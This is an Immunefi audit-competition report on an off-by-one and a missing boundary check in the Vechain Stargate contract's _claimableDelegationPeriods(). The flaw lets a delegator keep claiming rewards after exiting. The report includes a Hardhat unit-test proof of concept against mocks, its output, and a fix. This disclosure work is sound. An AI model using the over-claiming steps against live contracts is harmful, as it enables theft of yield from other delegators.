# 60069 sc high incorrect claimable period calculation leading to attacker keep claiming even after exiting the delegation&#x20;

**Submitted on Nov 18th 2025 at 07:49:27 UTC by @Bizarro for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #60069
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:**
  * Protocol insolvency
  * Theft of unclaimed yield

## Description

### Brief / Intro

The checks in `_claimableDelegationPeriods()` are not sufficient to prevent a delegator from claiming rewards after their delegation has ended. Off-by-one and missing boundary checks allow claiming periods beyond the delegation end.

{% stepper %}
{% step %}

### Vulnerability detail — off-by-one when endPeriod equals nextClaimablePeriod

In `_claimableDelegationPeriods()` when a delegation ends exactly at the next claimable period, the function can incorrectly return periods beyond the delegation's end, allowing claims for periods after exit.

Problematic code (logic):

```solidity
if (
    endPeriod != type(uint32).max &&
    endPeriod < currentValidatorPeriod &&
    endPeriod > nextClaimablePeriod  // ❌ WRONG: Should be >= 
) {
    return (nextClaimablePeriod, endPeriod);
}

// If above check fails, falls through to:
if (nextClaimablePeriod < currentValidatorPeriod) {
    return (nextClaimablePeriod, completedPeriods);  // ❌ Returns too many periods
}
```

Example path:

* User delegated from period 5 to period 10.
* User requested exit at period 9 → `endPeriod = 10`.
* User claimed up to period 9 → `lastClaimedPeriod = 9`.
* `nextClaimablePeriod = lastClaimedPeriod + 1 = 10`.
* Validator: `completedPeriods = 12`, `currentValidatorPeriod = 13`.

Evaluation:

```
// Check 1: endPeriod > nextClaimablePeriod
if (10 > 10) // FALSE - skip

// Falls through to Check 2: nextClaimablePeriod < currentValidatorPeriod  
if (10 < 13) // TRUE
    return (10, 12) // ❌ WRONG: Returns periods 10, 11, 12
```

Correct behavior (fix):

```
// Check 1: endPeriod >= nextClaimablePeriod
if (10 >= 10) // TRUE
    return (10, 10) // ✅ Only period 10
```

{% endstep %}

{% step %}

### Vulnerability detail — missing check when nextClaimablePeriod > endPeriod

When a delegation has ended and the last claimed period equals the end period, the function can still return non-zero ranges (allowing further claims) because there's no explicit guard ensuring `nextClaimablePeriod <= endPeriod`. The logic falls through and returns claimable periods beyond the delegation end.

Relevant code flow:

```solidity
if (
    endPeriod != type(uint32).max && // -> true 
    endPeriod < currentValidatorPeriod && // -> true
    endPeriod > nextClaimablePeriod  // -> false
) {
    return (nextClaimablePeriod, endPeriod); 
}

if (nextClaimablePeriod < currentValidatorPeriod) {
    return (nextClaimablePeriod, completedPeriods);  // -> claim from nextClaimablePeriod to completedPeriods.
}
```

Example path:

* User delegated from period 5 to period 10.
* User requested exit at period 9 → `endPeriod = 10`.
* User claimed up to period 9 → `lastClaimedPeriod = 9`.
* `nextClaimablePeriod = 10`.
* Validator: `completedPeriods = 9`, `currentValidatorPeriod = 10`.
* User claims → updates `lastClaimedPeriod = 10`.
* Later validator: `completedPeriods = 15`, `currentValidatorPeriod = 16`.

Evaluation:

```
// Check 1
if (10 != max32 && 10 < 16 && 10 > 11) // FALSE - skip

// Falls through to Check 2: nextClaimablePeriod < currentValidatorPeriod  
if (11 < 16) // TRUE
    return (11, 15) // ❌ WRONG: Returns periods 11..15
```

A missing check to ensure `nextClaimablePeriod <= endPeriod` (or returning (0,0) when `nextClaimablePeriod > endPeriod`) causes over-claiming.
{% endstep %}
{% endstepper %}

## Impact Details

* Over-claiming rewards for periods after delegation exit.
* Reduced funds available to honest delegators; potential protocol insolvency from excessive payouts.

## References

* Vulnerable file: <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L879C5-L934C6>

## Proof of Concept

Below instructions and code show how to reproduce the issue by instrumenting the contract and running a unit test.

Add a console.log to track the new effective values (example location): <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L742>

Example console log insertion:

```solidity
import "hardhat/console.sol";

console.log(
    "First claimable period: ",
    firstClaimablePeriod,
    " Last claimable period: ",
    lastClaimablePeriod
);
```

Add this test in `test/unit/Stargate/Rewards.test.ts` and run `yarn contracts:test:unit`:

```js
it.only("nextClaimablePeriod >= endPeriod", async () => {
    tx = await stargateContract.connect(deployer).setMaxClaimablePeriods(100000);
    await tx.wait();

    const levelId = 1;
    const levelSpec = await stargateNFTMock.getLevel(levelId);

    // Get three users
    const user1 = user;
    const user2 = (await ethers.getSigners())[6];
    const user3 = (await ethers.getSigners())[7];

    console.log("\n📝 Three users will stake and delegate to validator:", validator.address);

    // All three users stake and delegate NFTs
    const tokenIds: bigint[] = [];
    const users = [user1, user2, user3];

    for (let i = 0; i < users.length; i++) {
        const userAccount = users[i];

        // Stake NFT
        const stakeTx = await stargateContract.connect(userAccount).stake(levelId, {
            value: levelSpec.vetAmountRequiredToStake
        });
        await stakeTx.wait();

        const tokenId = await stargateNFTMock.getCurrentTokenId();
        tokenIds.push(tokenId);

        // Delegate to validator
        const delegateTx = await stargateContract
            .connect(userAccount)
            .delegate(tokenId, validator.address);
        await delegateTx.wait();

        console.log(`\n🎉 User${i + 1} staked and delegated NFT with tokenId:`, tokenId.toString());
    }

    tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 5); // 3'5 max claimable periods
    await tx.wait();

    await stargateContract.connect(user1).claimRewards(tokenIds[0]);
    console.log("\n🎉 user1 claimed rewards for tokenId:", tokenIds[0].toString());

    const exitTx = await stargateContract.connect(user1).requestDelegationExit(tokenIds[0]);
    await exitTx.wait();
    console.log("\n🚪 User1 requested delegation exit for tokenId:", tokenIds[0].toString());

    tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 9);
    await tx.wait();

    await stargateContract.connect(user1).claimRewards(tokenIds[0]);
    console.log("\n🎉 user1 claimed rewards for tokenId:", tokenIds[0].toString());

    tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 15);
    await tx.wait();

    await stargateContract.connect(user1).claimRewards(tokenIds[0]);
    console.log("\n🎉 user1 claimed rewards for tokenId:", tokenIds[0].toString());
});
```

Expected test output (demonstrating the incorrect returned ranges):

```
First claimable period:  2  Last claimable period:  5
🎉 user1 claimed rewards for tokenId: 10001
🚪 User1 requested delegation exit for tokenId: 10001
First claimable period:  6  Last claimable period:  9
🎉 user1 claimed rewards for tokenId: 10001
First claimable period:  10  Last claimable period:  15
🎉 user1 claimed rewards for tokenId: 10001
✔ nextClaimablePeriod = endPeriod (39ms)
```

(Full test logs available in the original report.)

## Suggested fix (summary)

* Change the strict `>` comparison to `>=` when checking `endPeriod` against `nextClaimablePeriod`.
* Add a guard to return (0,0) or otherwise prevent claims when `nextClaimablePeriod > endPeriod` (i.e., ensure you never return claimable ranges that start after the delegation end).

(Do not add other changes — the above describes only the minimal intended logic fixes based on the report.)
